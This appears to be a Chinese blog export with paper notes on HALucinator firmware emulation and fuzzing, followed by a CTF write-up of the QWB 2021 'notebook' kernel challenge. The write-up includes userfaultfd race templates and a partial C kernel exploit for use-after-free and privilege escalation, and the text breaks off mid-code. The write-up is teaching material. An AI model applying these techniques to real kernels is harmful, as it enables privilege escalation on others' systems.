    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>设备固件一直以来存在固件与硬件联系紧密，难以进行动态分析。然而，固件开发者们在编程时大量使用了抽象，如HAL（硬件抽象库），来简化编程工作。通过替换这些HAL库函数，可以做到将固件与硬件分离，从而实现对固件的模拟。作者提出了定位并替换这些库函数的方法，实现了HALucinator工具，能够对通用固件进行模拟，同时将AFL结合进去，实现了通用的模糊测试功能，进行实验，取得了显著成效。</p>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>对固件的自动化漏洞挖掘需要将固件模拟起来，但很多固件（如stm32上的一些应用固件）需要与硬件进行交互，这使得对它们的模拟非常困难</p>
<h2 id="研究对象"><a href="#研究对象" class="headerlink" title="研究对象"></a>研究对象</h2><p>该论文将研究对象限定为非系统化的单个固件（作者描述为“blob”），即那些被编译成为单个可执行文件的固件，所有依赖库都被静态链接进固件中，无文件系统。同时，作者在文中说明论文聚焦于来自不同芯片厂商的ARM Cortex-M架构上的固件</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><pre><code>1、实现了使用通用模拟器（qemu）对固件模拟，无需模拟具体硬件
2、改进现有的库匹配方法，能更好地匹配需要被介入的函数
3、实现了HALucinator，能够实现以高层级模拟固件，实现实时交互和模糊测试功能
4、在16个现实固件中测试，成功以最小成本实现模拟，发现了多个CVE
</code></pre>
<h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p>作者通过调研，发现属于研究目标的固件中都存在硬件抽象层（Hardware Abstract Layer，HAL）函数。</p>
<h3 id="硬件抽象层（Hardware-Abstract-Layer，HAL）简介"><a href="#硬件抽象层（Hardware-Abstract-Layer，HAL）简介" class="headerlink" title="硬件抽象层（Hardware Abstract Layer，HAL）简介"></a>硬件抽象层（Hardware Abstract Layer，HAL）简介</h3><p>可编程芯片厂商（如STM32系列芯片）为了简化用户的开发过程，在推出硬件产品时也会一并发布相关的库与工具链，而相关的库中，有一部分函数是厂商对底层硬件的抽象，用户只需调用（有时还需要提供一些参数）即可完成对一些硬件的操作，省去了用户研究底层硬件的过程，这些库函数在固件中就处于硬件抽象层，称之为HAL函数。</p>
<p>HAL函数就是目标固件中发生与硬件交互的地方，而这些函数的某种意义上减少了固件与实际硬件的结合程度（固件与硬件的交互只通过HAL库，变相脱耦）。这启发了作者，使他提出了针对HAL函数的无需模拟具体硬件的固件模拟方法。</p>
<h3 id="整体设计"><a href="#整体设计" class="headerlink" title="整体设计"></a>整体设计</h3><img src="/halucinator/overalldesign.png" class="">
<img src="/halucinator/hardwarestack.png" class="">
<p>整体设计如第一张图，HALucinator通过库函数匹配的方式确定固件中HAL函数的位置，通过插入介入代码（即图中的handler)的方式屏蔽这些函数，使得固件能够在不模拟具体硬件的情况下被通用模拟器模拟。handler支持自己编写，根据对具体硬件的需要不同，这些handler也可以写得不一样，可以非常简单，也可以很复杂<br>第二张图是一个工作在固件中的http服务实例，正常情况下http服务调用的网络层函数会调用HAL函数与底层硬件交互，实现实际功能，而HALucinator的实现中使用代码实现的model替换了HAL函数的位置，将底层接入到了通用模拟器上</p>
<h2 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h2><p>实现对固件的大范围模拟需要做到一下三点：</p>
<pre><code>1、定位固件中的HAL库函数
2、提供HAL函数的高抽象层替换
3、实现与固件的外部交互
</code></pre>
<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>实现模拟需要一些前提条件</p>
<pre><code>1、必须要完整固件
2、需要与具体硬件相关的一些参数（架构、内存加载偏移等）
3、库文件（带符号的）和工具链
</code></pre>
<p>这些条件一般都能满足，至少作者在论文里研究的基于ARM Cortex-M的硬件厂商都提供，固件中也能找到需要的数据</p>
<h3 id="库函数定位"><a href="#库函数定位" class="headerlink" title="库函数定位"></a>库函数定位</h3><p>库函数定位工作实际上就是对已经获取的带符号的库文件中的函数与目标固件中的函数做匹配，事先将两个文件反汇编，得到中间语言码（IR）和控制流图（CFG）等信息<br>作者根据固件中库函数的特点和前人工作，设计出了由以下三步构成的库函数定位方法：</p>
<pre><code>1、抽取目标固件中所有函数的基本块数量、CFG图边数量和函数调用数量，和带符号的库文件中每个库函数比较，只有三个数量都完全一样的才认为有可能是同一个函数，进入下一步的操作
2、比较两个函数中每个基本块的IR是否完全一致，比较时忽略指针、相对偏移寻址、重定位对象和一些无法解析的跳转。虽然思路很朴素，但作者认为该方法在保持较快的运行速度的同时有不错的匹配效果，换了其它方法可能匹配效果提升不多但速度下降明显
3、第二步中可能产生一些错误匹配，为了提高准确率，作者还设计了上下文匹配。这一步类似于bindiff软件中的函数调用匹配，但库文件中的函数是没有调用的。作者提出了调用上下文和被调用上下文匹配（caller context和callee context）两个过程，这两个过程会被递归式的施加在每个函数上（即被调用的函数也会进入这个过程）。这一步也是一个命名的过程。调用上下文匹配需要提取库文件中的符号信息，对每个库文件，会提取其调用的所有函数的名字信息，与其疑似匹配的固件中函数也会被提取这些信息，然后做名字匹配对比，完全匹配上才认为这两个函数是同一个函数（这一步作者写的有点模糊，不知道没有符号信息的固件中哪里来的函数名信息，推测其含义为匹配过程中命名，然后再根据命的名来进行这一步）。被调用上下文匹配是指，对于一对疑似匹配，会使用库函数中符号信息对固件中对应的被调用函数进行命名。
</code></pre>
<p>在进行完这三步后，完全匹配的函数会被赋予一个独特的名字，作为后面进行hook的标志。</p>
<h3 id="高层级模拟"><a href="#高层级模拟" class="headerlink" title="高层级模拟"></a>高层级模拟</h3><p>为了实现模拟，在完成函数识别之后必须对HAL函数进行替换执行。作者把实现这些函数替换分解成实现handlers和peripheral model，还实现了一个I&#x2F;O server用于统一数据交互</p>
<h4 id="handlers"><a href="#handlers" class="headerlink" title="handlers"></a>handlers</h4><p>对HAL函数的替换函数称为handlers，这些函数由用户手动编写完成。对每个HAL函数，handlers只需被实现一遍，同时作者指出大部分handlers包含的逻辑非常简单，编写它们不需要太大功夫。同时，对于具有大量HAL函数的库文件来说，大部分情况下只有其中的很小一部分HAL函数会被使用，作者提供了一个简单有效的办法来确定为哪些HAL函数编写handlers：先不指定handlers来运行目标，等目标卡在某个HAL就说明遇到了必须写handlers的位置，如此重复来确定所有需要写handlers的HAL</p>
<h4 id="peripheral-model"><a href="#peripheral-model" class="headerlink" title="peripheral model"></a>peripheral model</h4><p>对外部设备的内部逻辑进行刻画的部分称之为peripheral model，一般不需要编写非常复杂的逻辑，作为外部与模拟设备的数据交互源存在</p>
<h4 id="IO-server"><a href="#IO-server" class="headerlink" title="IO server"></a>IO server</h4><p>IO server作为外部数据与模拟器数据交互的中心存在，采用订阅&#x2F;发送的方式工作，所有数据会先在这里汇集，然后根据不同部件对数据的订阅将数据发往对应的部件，采取这种实现能方便地修改数据传递路径。</p>
<h4 id="非HAL硬件交互"><a href="#非HAL硬件交互" class="headerlink" title="非HAL硬件交互"></a>非HAL硬件交互</h4><p>除了使用HAL与硬件交互，固件中仍然存在一些直接与硬件交互的部分。作者调研发现很多这些操作都是在设置符号，于是作者将这些操作统一使用一个handler，写操作一律忽略，读操作一律返回0</p>
<h3 id="使用HALucinator进行fuzz"><a href="#使用HALucinator进行fuzz" class="headerlink" title="使用HALucinator进行fuzz"></a>使用HALucinator进行fuzz</h3><p>实现了对固件的模拟后，可以与固件进行直接交互，此时可以使用AFL来进行fuzz。但对固件的fuzz需要解决一些问题。</p>
<h4 id="如何把fuzz数据送进固件"><a href="#如何把fuzz数据送进固件" class="headerlink" title="如何把fuzz数据送进固件"></a>如何把fuzz数据送进固件</h4><p>HALucinator写了一个handler叫fuzz，作用为接收fuzz的输入，并将数据发到固件对应的输入接口上。用户可以自由编写fuzz handler来决定数据具体送往哪个输入接口。</p>
<h4 id="如何使程序正常终止"><a href="#如何使程序正常终止" class="headerlink" title="如何使程序正常终止"></a>如何使程序正常终止</h4><p>桌面软件在不崩溃的情况下会正常终止，但固件是持续执行的。作者编写了一个peripheral model fuzz来发送终止信号，使固件在正常逻辑代码执行完一遍后正常结束</p>
<h4 id="移除不确定性行为"><a href="#移除不确定性行为" class="headerlink" title="移除不确定性行为"></a>移除不确定性行为</h4><p>固件中的随机、获取时间等操作会带来不确定性，影响AFL收集数据。作者编写了一个static handler来给这些操作返回确定值</p>
<h4 id="计时器"><a href="#计时器" class="headerlink" title="计时器"></a>计时器</h4><p>固件中有个非常重要的部分——计时器，很多功能实现于计时器中断。但计时器存在不确定性，与模拟cpu性能有关，可能会在意料之外的地方触发计时器中断影响fuzz，作者编写了timer model来使计时器与执行过的基本块数量同步，消除不确定性。</p>
<h4 id="崩溃检测"><a href="#崩溃检测" class="headerlink" title="崩溃检测"></a>崩溃检测</h4><p>高层级模拟的函数替换给崩溃检测带来了方便，可以在固件执行过程中插入函数检测各种状态。HALucinator提供了很多model，能实现类似asan的内存泄漏检测功能。</p>
<h4 id="输入生成"><a href="#输入生成" class="headerlink" title="输入生成"></a>输入生成</h4><p>fuzz需要种子来进行输入的变异。由于固件的接口不同，通常情况下这个种子需要分析硬件。而HALucinator的交互模式可以通过记录固件正常使用时各个函数的参数和返回值，直接能得到种子，避免了研究硬件。</p>
<h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2><p>libmatch实现使用了angr框架，angr框架提供了VEX IR功能，可以方便地将目标固件翻译为IR，还提供了基本块相关的各种操作，方便进行比较之类的操作。<br>HALucinator实现使用了avatar2库，这个库实现了python调用qemu后端。handlers和models都使用python的类实现，而IO server通过ZeroMQ库实现<br>fuzz部分通过将qemu底层换成AFL-unicorn来实现</p>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>作者一共进行了四项实验来说明HALucinator的实际性能，实验结果如下</p>
<h3 id="libmatch-函数识别效果"><a href="#libmatch-函数识别效果" class="headerlink" title="libmatch 函数识别效果"></a>libmatch 函数识别效果</h3><img src="/halucinator/libmatchperformance.png" class="">
<h3 id="handler-编写难度"><a href="#handler-编写难度" class="headerlink" title="handler 编写难度"></a>handler 编写难度</h3><img src="/halucinator/handlers.png" class="">
<h3 id="模拟效果"><a href="#模拟效果" class="headerlink" title="模拟效果"></a>模拟效果</h3><img src="/halucinator/emulation.png" class="">
<h3 id="fuzz效果"><a href="#fuzz效果" class="headerlink" title="fuzz效果"></a>fuzz效果</h3><img src="/halucinator/fuzz.png" class="">

<h2 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h2><p>HALucinator良好工作需要目标固件使用HAL，并且HAL库和编译环境都被厂商公开，同时qemu需要支持固件的架构，同时必须有为目标所在的平台编写的handlers和models。缺少哪个都会显著增加模拟的困难性。<br>LibMatch所使用的的算法存在局限性，函数匹配能力收到限制。</p>
]]></content>
      <categories>
        <category>论文笔记</category>
      </categories>
      <tags>
        <tag>仿真模拟技术</tag>
        <tag>模糊测试</tag>
      </tags>
  </entry>
  <entry>
    <title>内核竞争条件漏洞学习——以qwb2021-notebook为例</title>
    <url>/qwb2021-notebook/</url>
    <content><![CDATA[<p>竞态条件入门学习</p>
<span id="more"></span>
<h2 id="竞态条件漏洞（Race-Condition）"><a href="#竞态条件漏洞（Race-Condition）" class="headerlink" title="竞态条件漏洞（Race Condition）"></a>竞态条件漏洞（Race Condition）</h2><p>linux支持多线程的程序，在C语言中，我们可以使用fork函数来实现多线程处理，从而提高程序的运行效率。但是多线程也会遇到问题：在对多线程共享的资源（例如全局变量）进行操作时，如果处理不当，多个线程不同步的操作会导致共享的资源被错误使用。<br>简单来说竞态条件漏洞的产生需要以下几点条件：<br>    1、多线程运行<br>    2、有共享对象<br>    3、对对象做了错误操作<br>竞态条件漏洞在linux内核中属于比较常见的，通常来讲，利用竞态条件漏洞可以构造出一些对内存的破坏，从而达到如UAF之类的效果。下面就通过2021年强网杯的notebook题来学习一下竞态条件漏洞的常见利用方式以及exp的编写。</p>
<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><img src="/qwb2021-notebook/files.jpg" class="">
<p>给的附件如上，那些id文件是ida生成的，不是给的。<br>比较重要的文件就是run.sh、bzimage和notebook.ko</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">stty intr ^]</span><br><span class="line">exec timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append &quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot; -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2&gt;/dev/null -s</span><br></pre></td></tr></table></figure>
<p>run.sh的内容如上，从启动脚本可以看出，这是64位系统，开了双核，kaslr、smep、smap都开了，给的是user权限，注意还有一个timeout，调试时记得关掉。</p>
<h2 id="调试以及一些需要的工具"><a href="#调试以及一些需要的工具" class="headerlink" title="调试以及一些需要的工具"></a>调试以及一些需要的工具</h2><p>调试内核，使用gdb-gef扩展比较方便，gef的安装我这里就不多写了，去github上下过来在gdbinit里面source就行了。<br>在启动qemu的脚本里加入-s就可以打开一个1234端口给gdb连入，这里启动脚本里已经有了<br>在最后传入exp时需要解压以及重新压缩文件系统，指令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#解压</span><br><span class="line">mkdir fs &amp;&amp; cd fs</span><br><span class="line">cp ../rootfs.cpio ./rootfs.cpio</span><br><span class="line">cpio -idmv &lt; rootfs.cpio </span><br><span class="line">#重新压缩</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br></pre></td></tr></table></figure>
<p>exp编写完后需要编译，记住使用静态编译<br>调试前，需要从bzImage中提取出vmlinux，提取脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># SPDX-License-Identifier: GPL-2.0-only</span><br><span class="line"># ----------------------------------------------------------------------</span><br><span class="line"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span><br><span class="line">#</span><br><span class="line"># Inspired from extract-ikconfig</span><br><span class="line"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span><br><span class="line">#</span><br><span class="line"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span><br><span class="line">#</span><br><span class="line"># ----------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line">	# Use readelf to check if it&#x27;s a valid ELF</span><br><span class="line">	# TODO: find a better to way to check that it&#x27;s really vmlinux</span><br><span class="line">	#       and not just an elf</span><br><span class="line">	readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1</span><br><span class="line"></span><br><span class="line">	cat $1</span><br><span class="line">	exit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line">	# The obscure use of the &quot;tr&quot; filter is to work around older versions of</span><br><span class="line">	# &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span><br><span class="line"></span><br><span class="line">	# Try to find the header ($1) and decompress from here</span><br><span class="line">	for	pos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`</span><br><span class="line">	do</span><br><span class="line">		pos=$&#123;pos%%:*&#125;</span><br><span class="line">		tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null</span><br><span class="line">		check_vmlinux $tmp</span><br><span class="line">	done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Check invocation:</span><br><span class="line">me=$&#123;0##*/&#125;</span><br><span class="line">img=$1</span><br><span class="line">if	[ $# -ne 1 -o ! -s &quot;$img&quot; ]</span><br><span class="line">then</span><br><span class="line">	echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2</span><br><span class="line">	exit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Prepare temp files:</span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line">trap &quot;rm -f $tmp&quot; 0</span><br><span class="line"></span><br><span class="line"># That didn&#x27;t work, so retry after decompression.</span><br><span class="line">try_decompress &#x27;\037\213\010&#x27; xy    gunzip</span><br><span class="line">try_decompress &#x27;\3757zXZ\000&#x27; abcde unxz</span><br><span class="line">try_decompress &#x27;BZh&#x27;          xy    bunzip2</span><br><span class="line">try_decompress &#x27;\135\0\0\0&#x27;   xxx   unlzma</span><br><span class="line">try_decompress &#x27;\211\114\132&#x27; xy    &#x27;lzop -d&#x27;</span><br><span class="line">try_decompress &#x27;\002!L\030&#x27;   xxx   &#x27;lz4 -d&#x27;</span><br><span class="line">try_decompress &#x27;(\265/\375&#x27;   xxx   unzstd</span><br><span class="line"></span><br><span class="line"># Finally check for uncompressed images or objects:</span><br><span class="line">check_vmlinux $img</span><br><span class="line"></span><br><span class="line"># Bail out:</span><br><span class="line">echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2</span><br></pre></td></tr></table></figure>
<p>调试时，在虚拟机中查看模块的加载基址，然后在gdb-gef中通过add-symbol-file指令加载模块即可加载出正确的符号信息。</p>
<img src="/qwb2021-notebook/addsym.jpg" class="">
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个题给了个堆菜单，维护一个全局变量，通过add可以写，而通过edit可以修改已创建的堆的大小。在堆的操作上没有漏洞。这个题的漏洞在于它使用的copy_from_user函数即便是在有锁的情况下也是防不住竞争写的，就有了个竞态条件的问题。</p>
<img src="/qwb2021-notebook/copy_from_user.jpg" class="">
<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>这个题的目的很明确，要提权，就是要想办法用ring0权限执行commit_pred</p>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>首先我们需要构造内存破坏，这题是堆题我们就需要搞点堆上的问题，从这个竞态条件来看，构造UAF是可能的，最简单的思路是通过竞态条件产生两个重叠的堆块，但单纯的不断竞争产生这种情况的可能比较小，这个时候我们就需要用到userfaultfd了。</p>
<h4 id="user-fault-fd"><a href="#user-fault-fd" class="headerlink" title="user_fault_fd"></a>user_fault_fd</h4><p>userfaultfd 并不是一种攻击的名字，它是 Linux 提供的一种让用户自己处理缺页异常的机制，初衷是为了提升开发灵活性。<br>通过这个机制，本来需要看运气的竞争触发就变得简单了起来。copy_from_user函数在复制的时候如果遇到mmap出来的地址，就有可能出现缺页，从而被我们自定义的函数给劫持了控制流。<br>注册模板如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void ErrExit(char* err_msg)</span><br><span class="line">&#123;</span><br><span class="line">    puts(err_msg);</span><br><span class="line">    exit(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void RegisterUserfault(void *fault_page,void *handler)</span><br><span class="line">&#123;</span><br><span class="line">    pthread_t thr;</span><br><span class="line">    struct uffdio_api ua;</span><br><span class="line">    struct uffdio_register ur;</span><br><span class="line">    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = 0;</span><br><span class="line">    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)</span><br><span class="line">        ErrExit(&quot;[-] ioctl-UFFDIO_API&quot;);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (unsigned long)fault_page; //我们要监视的区域</span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1) //注册缺页错误处理</span><br><span class="line">        //当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span><br><span class="line">        ErrExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);</span><br><span class="line">    //开一个线程，接收错误的信号，然后处理</span><br><span class="line">    int s = pthread_create(&amp;thr, NULL,handler, (void*)uffd);</span><br><span class="line">    if (s!=0)</span><br><span class="line">        ErrExit(&quot;[-] pthread_create&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>劫持控制流一般都是用来卡死程序，来达到方便竞争的目的。<br>卡死模板：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void userfault_stuck_handler(void* arg)</span><br><span class="line">&#123;</span><br><span class="line">    struct uffd_msg msg;</span><br><span class="line">    unsigned long uffd = (unsigned long) arg;</span><br><span class="line">    struct pollfd pollfd;</span><br><span class="line">    int nready;</span><br><span class="line">    puts(&quot;[+] stuck handler init&quot;);</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, 1, -1);</span><br><span class="line">        sleep(3);</span><br><span class="line">    if (nready != 1)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] Wrong poll return val&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, sizeof(msg));</span><br><span class="line">    if (nready &lt;= 0)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] msg err&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">    if (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] mmap err&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    struct uffdio_copy uc;</span><br><span class="line">    // init page</span><br><span class="line">    memset(page, 0, sizeof(page));</span><br><span class="line">    uc.src = (unsigned long) page;</span><br><span class="line">    uc.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - 1);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = 0;</span><br><span class="line">    uc.copy = 0;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    puts(&quot;[+] stuck handler done&quot;);</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基于以上知识我们先来编写一个能导致UAF的exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;syscall.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;linux/userfaultfd.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line">#define PAGE_SIZE 0x1000</span><br><span class="line">#define TTY_STRUCT_SZIE 0x2E0</span><br><span class="line"></span><br><span class="line">size_t work_for_cpu_fn_off = 0xffffffff8949eb90 - 0xffffffff8a28e440;</span><br><span class="line">size_t prepare_kernel_cred_off = 0xffffffffa14a9ef0 - 0xffffffffa228e440;</span><br><span class="line">size_t commit_creds_off = 0xffffffffa14a9b40 - 0xffffffffa228e440;</span><br><span class="line"></span><br><span class="line">int note_fd;</span><br><span class="line">void* stuck_mapped_memory;</span><br><span class="line"></span><br><span class="line">struct userarg</span><br><span class="line">&#123;</span><br><span class="line">	size_t idx;</span><br><span class="line">	size_t size;</span><br><span class="line">	void* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct notebook</span><br><span class="line">&#123;</span><br><span class="line">    void* note;</span><br><span class="line">    size_t size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void ErrExit(char* err_msg)</span><br><span class="line">&#123;</span><br><span class="line">    puts(err_msg);</span><br><span class="line">    exit(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void RegisterUserfault(void *fault_page,void *handler)</span><br><span class="line">&#123;</span><br><span class="line">    pthread_t thr;</span><br><span class="line">    struct uffdio_api ua;</span><br><span class="line">    struct uffdio_register ur;</span><br><span class="line">    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = 0;</span><br><span class="line">    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)</span><br><span class="line">        ErrExit(&quot;[-] ioctl-UFFDIO_API&quot;);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (unsigned long)fault_page; //我们要监视的区域</span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1) //注册缺页错误处理</span><br><span class="line">        //当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span><br><span class="line">        ErrExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);</span><br><span class="line">    //开一个线程，接收错误的信号，然后处理</span><br><span class="line">    int s = pthread_create(&amp;thr, NULL,handler, (void*)uffd);</span><br><span class="line">    if (s!=0)</span><br><span class="line">        ErrExit(&quot;[-] pthread_create&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void noteadd(size_t idx,size_t size,void * buf)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    notearg.size = size;</span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    ioctl(note_fd,256,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void notedelete(size_t idx)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    ioctl(note_fd,512,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void noteedit(size_t idx, size_t newsize, void *buf)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    notearg.size = newsize;</span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    ioctl(note_fd,768,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void notegift(void *buf)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    ioctl(note_fd,100,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void userfault_stuck_handler(void* arg)</span><br><span class="line">&#123;</span><br><span class="line">    struct uffd_msg msg;</span><br><span class="line">    unsigned long uffd = (unsigned long) arg;</span><br><span class="line">    struct pollfd pollfd;</span><br><span class="line">    int nready;</span><br><span class="line">    puts(&quot;[+] stuck handler init&quot;);</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, 1, -1);</span><br><span class="line">    pause();</span><br><span class="line">    if (nready != 1)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] Wrong poll return val&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, sizeof(msg));</span><br><span class="line">    if (nready &lt;= 0)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] msg err&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">    if (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] mmap err&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    struct uffdio_copy uc;</span><br><span class="line">    // init page</span><br><span class="line">    memset(page, 0, sizeof(page));</span><br><span class="line">    uc.src = (unsigned long) page;</span><br><span class="line">    uc.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - 1);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = 0;</span><br><span class="line">    uc.copy = 0;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    puts(&quot;[+] stuck handler done&quot;);</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void* edit_thread(int idx)</span><br><span class="line">&#123;</span><br><span class="line">	puts(&quot;[+] edit thread start!&quot;);</span><br><span class="line">	noteedit(idx, 0, stuck_mapped_memory);</span><br><span class="line">	puts(&quot;[+] edit thread end!&quot;); // won&#x27;t reach here</span><br><span class="line">	return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void* add_thread(int idx)</span><br><span class="line">&#123;</span><br><span class="line">	puts(&quot;[+] add thread start!&quot;);</span><br><span class="line">	noteadd(idx, 0x60, stuck_mapped_memory);</span><br><span class="line">	puts(&quot;[+] add thread end!&quot;); // won&#x27;t reach here</span><br><span class="line">	return NULL;</span><br><span class="line">&#125;</span><br><span class="line">char buf_a[0x500] = &#123;&quot;aaa&quot;&#125;;</span><br><span class="line">size_t buf_tty[0x100], buf_fake_table[0x500];</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int pid,tty_fd;</span><br><span class="line">    stuck_mapped_memory = mmap(NULL, PAGE_SIZE, 